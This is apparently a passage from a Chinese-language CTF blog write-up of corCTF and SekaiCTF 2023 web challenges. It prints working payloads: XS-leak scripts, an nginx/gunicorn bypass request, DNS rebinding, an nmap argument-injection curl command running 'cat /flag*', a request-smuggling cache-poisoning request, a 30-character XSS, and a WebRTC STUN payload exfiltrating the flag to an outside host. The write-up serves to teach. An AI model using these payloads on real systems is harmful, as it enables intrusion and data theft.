+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;d'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=0c6caa61575b9478'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;e'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=071e07ec5b7fc2be'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;f'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=71652df64d54c0e4'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;g'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=354f3bec25e02332'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;k'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=066aa475493e1a4c'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;l'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=54a12f7b11098d2a'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;o'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=621591145bcfc8e0'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;r'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=6b44725cb5e274f0'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;t'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=e025b26e5e7117a1'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;y'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=f10001d89230485e'</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> <span class="token function">testNote</span><span class="token punctuation">(</span><span class="token string">'&#123;z'</span><span class="token punctuation">,</span><span class="token string">'https://leakynote.be.ax/post.php?id=a71fc5d1ff81edad'</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>賽後看到另外兩位的解法也很有趣，其中一個是透過載入字體來 leak，當你這樣做的時候：</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
+    <span class="token property">font-family</span><span class="token punctuation">:</span> a<span class="token punctuation">;</span>
+    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/time-before<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/search.php?query=corctf&#123;a<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/search.php?query=corctf&#123;a<span class="token punctuation">)</span></span><span class="token punctuation">,</span>... <span class="token comment">/*10000 times */</span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/time-after<span class="token punctuation">)</span></span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Chrome 會根據 status code 來判斷怎麼處理，如果是 200 就會偵測是不是合法的字體，如果是 404 就直接失敗，因此可以用字體載入的時間來判斷 status code。</p>
+<p>ref: <a target="_blank" rel="noopener" href="https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45">https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45</a></p>
+<p>另一位也是利用 CSS 檔案有沒有載入的特性，只是不是利用 cache，而是利用一次打開大量頁面造成 server side 忙碌，響應時間變慢，透過這點來判斷。</p>
+<p>ref: <a target="_blank" rel="noopener" href="https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09">https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09</a></p>
+<h3><span id="pdf-pal-2-solves">pdf-pal (2 solves)</span></h3><p>這題的 nginx config 長這樣：</p>
+<pre class="line-numbers language-none"><code class="language-none">location &#x2F; &#123;
+    proxy_pass http:&#x2F;&#x2F;localhost:7777;
+
+    location ^~ &#x2F;generate &#123;
+        allow 127.0.0.1;
+        deny all;
+    &#125;
+
+    location ^~ &#x2F;rename &#123;
+        allow 127.0.0.1;
+        deny all;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以照理來說是無法訪問到 <code>/generate</code> 路徑，但可以利用 gunicorn 跟 nginx 的 parser 差異來繞過：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;generate&#123;chr(9)&#125;HTTP&#x2F;1.1&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>相關 ticket：<a target="_blank" rel="noopener" href="https://github.com/benoitc/gunicorn/issues/2530">https://github.com/benoitc/gunicorn/issues/2530</a></p>
+<p>繞過之後就可以用 <code>/generate</code> 的功能去產生 PDF，但是因為這個 service 本身有擋一些 block list，所以沒辦法直接把 flag 變成 PDF。</p>
+<p>解法是利用 DNS rebinding 去 POST <code>http://localhost:7778</code>，就可以拿到 response。</p>
+<p>例如說我們現在有個 domain <code>example.com</code>，背後有兩個 A record，一個指向真的 ip，另一個指向 0.0.0.0，這時候 admin bot 訪問 <code>http://example.com:7778/</code>，解析真的 IP，成功取得頁面。</p>
+<p>這時我們把 server 關掉，然後去執行 <code>fetch(&#39;http://example.com:7778/generate&#39;)</code>，此時因為原本的 ip 已經無法訪問，瀏覽器就會轉為 0.0.0.0，成功把 request 發到我們想要的位置，也因為是 same-origin 所以可以拿到 response。</p>
+<p>更多細節可以參考：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/nccgroup/singularity">https://github.com/nccgroup/singularity</a></li>
+<li><a target="_blank" rel="noopener" href="https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)">https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)</a></li>
+</ol>
+<h3><span id="lemon-csp-1-solve">lemon-csp (1 solve)</span></h3><p>找到 0 day 的 CSP bypass，沒有公開解法。</p>
+<h3><span id="0day-1-solve">0day (1 solve)</span></h3><p>這題是找到 VM2 的 1day，沒有公開解法。</p>
+<h2><span id="sekaictf-2023">SekaiCTF 2023</span></h2><p>題目的原始碼都在這裡：<a target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web">https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web</a></p>
+<h3><span id="scanner-service-146-solves">Scanner Service (146 solves)</span></h3><p>輸入 port 跟 host，會執行底下程式碼：</p>
+<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">nmap <span class="token operator">-</span>p <span class="token comment">#&#123;port&#125; #&#123;hostname&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但是傳入的資料會先經過 sanitizer，有字元限制。</p>
+<p>tab 可以用，所以可以用 tab 來新增參數，比賽中的時候是用了 <code>-iL /flag.txt -oN -</code> 來過關的，把輸出導到 stdout，或是用 <code>/dev/stdout</code> 也成立。</p>
+<p>官方的 writeup 是先用 <code>http-fetch</code> 這個 script 把檔案下載到本機，再跑一次 <code>nmap --script</code> 去執行那個腳本：</p>
+<pre class="line-numbers language-none"><code class="language-none">--script http-fetch -Pn --script-args http-fetch.destination&#x3D;&#123;DOWNLOAD_DIR&#125;,http-fetch.url&#x3D;&#123;NSE_SCRIPT&#125;
+--script&#x3D;&#123;DOWNLOAD_DIR&#125;&#x2F;&#123;LHOST&#125;&#x2F;&#123;LPORT&#125;&#x2F;&#123;NSE_SCRIPT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>在 Discord 中看到 @zeosutt 提供另外一種有趣的解法是運用了 rack 上傳檔案會留在 <code>/tmp/</code> 中的技巧，直接引入上傳的檔案就好：</p>
+<pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;35.231.135.130:32190&#x2F; -F $&#39;service&#x3D;127.0.0.1:1337\t--script\t&#x2F;tmp&#x2F;RackMultipart?????????????????&#39; -F &#39;&#x3D;os.execute(&quot;cat &#x2F;flag*&quot;);filename&#x3D;evil&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3><span id="frog-waf-29-solves">Frog-WAF (29 solves)</span></h3><p><code>buildConstraintViolationWithTemplate</code> 有 EL injection 的問題，剩下的是繞過 WAF。</p>
+<p>之前有實際的產品就是出過一樣的洞：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-wfj5-2mqr-7jvv">Expression Language Injection in Netflix Conductor</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7889">CVE-2020-9296-Netflix-Conductor-RCE-漏洞分析</a></li>
+</ol>
+<p>怎麼繞的部分可以參考底下幾篇：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py">https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py</a></li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba">https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba</a></li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00</a></li>
+</ol>
+<h3><span id="chunky-16-solves">Chunky (16 solves)</span></h3><p>這題有一個 cache server + backend server，請求都會先通過 cache server 再到 backend 去，然後留一份快取在 cache server 中，而目標是要污染快取。</p>
+<p>解法直接貼 <a target="_blank" rel="noopener" href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">zeyu</a> 的 writeup，就是像 request smuggling 那樣構造出一個兩邊理解不同的請求：</p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;aaaaa HTTP&#x2F;1.1
+Host: localhost
+transfer-encoding: chunked
+Content-Length: 102
+
+0
+
+GET &#x2F;post&#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP&#x2F;1.1
+X: GET &#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;.well-known&#x2F;jwks.json HTTP&#x2F;1.1
+Host: localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>cache server 會看 <code>Content-Length</code>，把第二個請求看作是 <code>GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json</code>，而 backend server 看 <code>transfer-encoding</code>，所以看作是 <code>GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5</code>，如此一來就能用另一個 path 的 response 去污染 jwks.json，達成 cache poisoning</p>
+<h3><span id="golf-jail-16-solves">Golf Jail (16 solves)</span></h3><p>這題我有認真解，大概花了一天左右，覺得很有趣，而且程式碼很精簡。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cross-Origin-Opener-Policy: same-origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"🚩🚩🚩"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SEKAI&#123;test_flag&#125;"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span>
+            <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>allow-scripts<span class="token punctuation">"</span></span>
+            <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;!-- <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token delimiter important">?></span></span> -->&lt;div><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>&lt;/div><span class="token punctuation">"</span></span>
+        <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>給你一個 30 字的 free XSS，要能執行任意程式碼。</p>
+<p>這邊的巧妙之處是用了 <code>&lt;iframe srcdoc&gt;</code> 搭配 <code>sandbox=allow-scripts</code>，創造出一個可以執行程式碼，但同時 origin 又是 <code>null</code>，而且 CSP 還繼承上層的執行環境。</p>
+<p>因此你無法存取到 top 的任何資訊，包括 name 或是 location 之類的都不行。</p>
+<p>到處找來找去之後在 document 裡面找到了 <code>baseURI</code>，發現它的值原來會繼承上層，而且是完整的 path，所以用 <code>&lt;svg/onload=eval(&quot;&#39;&quot;+baseURI)&gt;</code> 以後搭配 hash 就可以執行任意程式碼了，剛好 30 個字。</p>
+<p>這邊之所以可以用 <code>baseURI</code> 就可以存取到 <code>document.baseURI</code>，是因為 inline event handler 的 scope 會自動被加上 document，這我在<a href="https://blog.huli.tw/2021/10/25/learn-frontend-from-security-pov/">接觸資安才發現我不懂前端</a>這篇裡面有寫到過。</p>
+<p>有了 XSS 以後，可以用 <code>document.childNodes[0].nodeValue</code> 把 flag 取出來，最後的問題就是要怎麼傳出去。這題 CSP 很嚴格，而且重新導向又不能使用，也不能 <code>window.open</code>（話說我覺得這個網頁不用開啟新的 <code>navigate-to</code> 就可以達到類似的效果，很厲害），那就只能用一些現成的繞過了。</p>
+<p>我先試了 dns prefetch 但是沒用，發現 Chrome 在 112 的時候 release 了 <a target="_blank" rel="noopener" href="https://chromestatus.com/feature/5553640629075968">Feature: Resoure Hint “Least Restrictive” CSP</a>，或許這就是原因？</p>
+<p>但沒關係，WebRTC 還是有用的，只是我自己試很久都沒試出來怎麼用，最後是看<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/37702">別題的 writeup</a>，直接拿裡面 payload 出來用，再搭配 DNS：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> flag <span class="token operator">=</span> document<span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"SEKAI&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">c</span> <span class="token operator">=></span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RTCPeerConnection</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">iceServers</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">urls</span><span class="token operator">:</span> <span class="token string">"stun:"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">".29e6037fd1.ipv6.1433.eu.org:1337"</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p<span class="token punctuation">.</span><span class="token function">createDataChannel</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+p<span class="token punctuation">.</span><span class="token function">setLocalDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3><span id="leakless-note-4-solves">Leakless Note (4 solves)</span></h3><p>前面寫過的 leakynote 的進階版，這次 CSP 變嚴格，多了 <code>default-src &#39;self&#39;</code>，然後頁面上也沒有其他 css 檔案了。</p>
+<p>情境一樣，有一個 iframe，可能會載入可能沒載入，要能偵測到這點。</p>
+<p>作者 strellic 的解法是：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// leakless note oracle</span>
+<span class="token keyword">const</span> <span class="token function-variable function">oracle</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">w<span class="token punctuation">,</span> href</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> runs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> samples <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">600</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token number">1e6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">const</span> t <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            w<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>b<span class="token punctuation">.</span>buffer<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            samples<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">delete</span> b<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        runs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>samples<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=></span>a<span class="token operator">+</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        w<span class="token punctuation">.</span>location <span class="token operator">=</span> href<span class="token punctuation">;</span>
+        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rate limit</span>
+        <span class="token keyword">await</span> <span class="token function">waitFor</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    runs<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">median</span><span class="token operator">:</span> <span class="token function">median</span><span class="token punctuation">(</span>runs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">sum</span><span class="token operator">:</span> runs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=></span>a<span class="token operator">+</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        runs
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>當你對 iframe 送一個很大的 message 的時候，花費的時間會不一樣。</p>
+<p>另一隊似乎是開了 1000 個 tab 然後去測網路的時間，現在想想發現好像還滿合理的？如果 iframe 是 200 的話就會發出一堆 request，拖慢網路速度。</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2023/09/11/mp4-in-img-src/">原來 img src 也支援 mp4（Safari 限定）</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2023/08/29/intigriti-0823-author-writeup/">Intigriti 0823 挑戰 - Math jail 解法以及心得</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">評論</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>繁體中文</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2023/09/02/en/corctf-sekaictf-2023-writeup/" class="dropdown-item">
+                    English
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
